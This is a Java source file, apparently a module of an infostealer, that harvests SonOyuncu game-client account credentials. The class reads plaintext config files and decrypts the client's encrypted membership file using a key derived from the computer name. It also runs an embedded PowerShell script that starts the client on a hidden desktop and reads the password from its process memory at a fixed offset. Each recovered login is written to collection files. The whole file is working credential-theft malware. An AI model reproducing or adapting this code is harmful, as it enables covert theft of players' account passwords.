package itzgonza.hollyshit.impl.game;

import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;

import org.apache.commons.io.FileUtils;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import itzgonza.hollyshit.utils.utilities;

public class SonOyuncu extends utilities {

    public void initialize() throws Exception {
        File sonoyuncuExe = new File(System.getenv("APPDATA") + "/.sonoyuncu/sonoyuncuclient.exe");
        File configFile = new File(System.getenv("APPDATA") + "/.sonoyuncu/sonoyuncu-membership.json");
        
        if (!sonoyuncuExe.exists()) return;
        
        // Try to decrypt from membership.json first
        if (configFile.exists()) {
            JsonObject decryptedData = getDecryptedJson(configFile);
            if (decryptedData != null) {
                String username = decryptedData.has("sonOyuncuUsername") ? decryptedData.get("sonOyuncuUsername").getAsString() : null;
                String password = decryptedData.has("sonOyuncuPassword") ? 
                    new String(Base64.getDecoder().decode(decryptedData.get("sonOyuncuPassword").getAsString()), StandardCharsets.UTF_8) : null;
                
                if (username != null && password != null && !password.isEmpty()) {
                    File outputFile = new File(getFolder() + "/game/sonoyuncu/acc.txt");
                    outputFile.getParentFile().mkdirs();
                    FileUtils.writeStringToFile(outputFile, username + ":" + password + "\n", StandardCharsets.UTF_8, true);
                    content.add("sonoyuncu");
                    return;
                }
            }
        }
        
        // Alternative: Try to read from config.json
        File altConfig = new File(System.getenv("APPDATA") + "/.sonoyuncu/config.json");
        if (altConfig.exists()) {
            String jsonContent = FileUtils.readFileToString(altConfig, StandardCharsets.UTF_8);
            JsonObject obj = JsonParser.parseString(jsonContent).getAsJsonObject();
            
            String username = obj.has("userName") ? obj.get("userName").getAsString() : null;
            String password = obj.has("password") ? obj.get("password").getAsString() : null;
            
            if (username != null && password != null && !password.isEmpty()) {
                File outputFile = new File(getFolder() + "/game/sonoyuncu/acc.txt");
                outputFile.getParentFile().mkdirs();
                FileUtils.writeStringToFile(outputFile, username + ":" + password + "\n", StandardCharsets.UTF_8, true);
                content.add("sonoyuncu");
            }
        }
        
        // Expert Memory Extraction (Hidden Desktop)
        try {
            String desktopName = "SecretDesk_" + System.currentTimeMillis();
            String psScript = "$desktopName = \"" + desktopName + "\"; " +
                "Add-Type -TypeDefinition @\"\n" +
                "using System; using System.Runtime.InteropServices; public class DesktopHelper {\n" +
                "    [DllImport(\"user32.dll\")] public static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);\n" +
                "    [DllImport(\"user32.dll\")] public static extern bool CloseDesktop(IntPtr hDesktop);\n" +
                "    [DllImport(\"user32.dll\")] public static extern bool SetThreadDesktop(IntPtr hDesktop);\n" +
                "    [DllImport(\"kernel32.dll\")] public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);\n" +
                "    [DllImport(\"kernel32.dll\")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);\n" +
                "    [DllImport(\"kernel32.dll\")] public static extern bool ReadProcessMemory(IntPtr hProcess, long lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesRead);\n" +
                "    [DllImport(\"kernel32.dll\")] public static extern bool CloseHandle(IntPtr hObject);\n" +
                "    [StructLayout(LayoutKind.Sequential)] public struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }\n" +
                "    [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }\n" +
                "}\n" +
                "\"@; " +
                "$si = New-Object DesktopHelper+STARTUPINFO; $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si); $si.lpDesktop = $desktopName; $si.dwFlags = 1; $si.wShowWindow = 0; " +
                "$pi = New-Object DesktopHelper+PROCESS_INFORMATION; " +
                "$desktop = [DesktopHelper]::CreateDesktop($desktopName, [IntPtr]::Zero, [IntPtr]::Zero, 0, 0x10000000, [IntPtr]::Zero); " +
                "if ($desktop -ne [IntPtr]::Zero) { " +
                "    [DesktopHelper]::SetThreadDesktop($desktop) | Out-Null; " +
                "    $success = [DesktopHelper]::CreateProcess($null, \"" + sonoyuncuExe.getAbsolutePath().replace("\\", "\\\\") + "\", [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x08000000, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi); " +
                "    if ($success) { Start-Sleep -Seconds 3; " +
                "        $p = Get-Process -Id $pi.dwProcessId -ErrorAction SilentlyContinue; " +
                "        if ($p) { $m = $p.Modules | Where { $_.ModuleName -eq \"sonoyuncuclient.exe\" } | Select -First 1; " +
                "            if ($m) { $addr = [Int64]$m.BaseAddress + 0x1EBBB0; $buf = New-Object byte[] 32; $read = 0; " +
                "                $h = [DesktopHelper]::OpenProcess(0x0010, $false, $pi.dwProcessId); " +
                "                if ($h -ne [IntPtr]::Zero) { [DesktopHelper]::ReadProcessMemory($h, $addr, $buf, $buf.Length, [ref]$read) | Out-Null; " +
                "                    [DesktopHelper]::CloseHandle($h) | Out-Null; " +
                "                    $pass = [System.Text.Encoding]::UTF8.GetString($buf).Trim([char]0); " +
                "                    if ($pass.Length -gt 3) { echo \"PASS:$pass\" } " +
                "                } " +
                "            } " +
                "        } " +
                "        Stop-Process -Id $pi.dwProcessId -Force -ErrorAction SilentlyContinue; " +
                "    } " +
                "    [DesktopHelper]::CloseDesktop($desktop) | Out-Null; " +
                "}";

            String result = runPowerShellSync(psScript);
            if (result.contains("PASS:")) {
                String memPass = result.split("PASS:")[1].trim();
                File outputFile = new File(getFolder() + "/game/sonoyuncu/mem_pass.txt");
                outputFile.getParentFile().mkdirs();
                FileUtils.writeStringToFile(outputFile, "Expert Recovery: " + memPass + "\n", StandardCharsets.UTF_8, true);
                content.add("sonoyuncu (expert)");
            }
        } catch (Exception ignored) {}
    }

    private JsonObject getDecryptedJson(File file) throws Exception {
        if (!file.isFile()) return null;

        DataInputStream dataInputStream = new DataInputStream(new FileInputStream(file));
        
        // Check magic byte
        if (dataInputStream.read() != 31) {
            dataInputStream.close();
            return null;
        }

        byte[] salt = new byte[8];
        dataInputStream.readFully(salt);

        int encryptedDataLength = dataInputStream.readInt();
        byte[] encryptedData = new byte[encryptedDataLength];
        dataInputStream.readFully(encryptedData);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int bytesRead;

        while ((bytesRead = dataInputStream.read(buffer, 0, buffer.length)) != -1) {
            byteArrayOutputStream.write(buffer, 0, bytesRead);
        }
        dataInputStream.close();

        // Derive key from computer name
        String computerName = System.getenv("COMPUTERNAME");
        PBEKeySpec keySpec = new PBEKeySpec(computerName.toCharArray(), salt, 65536, 128);
        SecretKeyFactory keyFactory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
        byte[] keyBytes = keyFactory.generateSecret(keySpec).getEncoded();
        SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec ivSpec = new IvParameterSpec(encryptedData, 0, 16);
        cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, ivSpec);

        byte[] decryptedData = cipher.doFinal(byteArrayOutputStream.toByteArray());

        return JsonParser.parseString(new String(decryptedData, StandardCharsets.UTF_8)).getAsJsonObject();
    }
}